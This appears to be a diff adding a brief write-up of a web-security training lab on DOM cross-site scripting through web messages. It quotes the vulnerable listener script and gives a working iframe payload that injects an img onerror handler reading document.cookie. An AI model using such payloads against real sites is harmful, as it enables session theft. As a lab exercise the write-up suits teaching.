@@ -1,0 +1,16 @@
+DOM XSS using web messages
+
+The trick in this lab is the script in the page source that's waiting for a message:
+
+
+<script>
+    window.addEventListener('message', function(e) {
+        document.getElementById('ads').innerHTML = e.data;
+    })
+</script>
+
+Which waits for a message. We can build a payload that looks like this:
+
+<iframe src="https://ac141fe61e87915580b02e7600cb00f6.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(document.cookie)>','*')">
+
+Store it and deliver it to your target. How exactly it works is described in the lab solution.
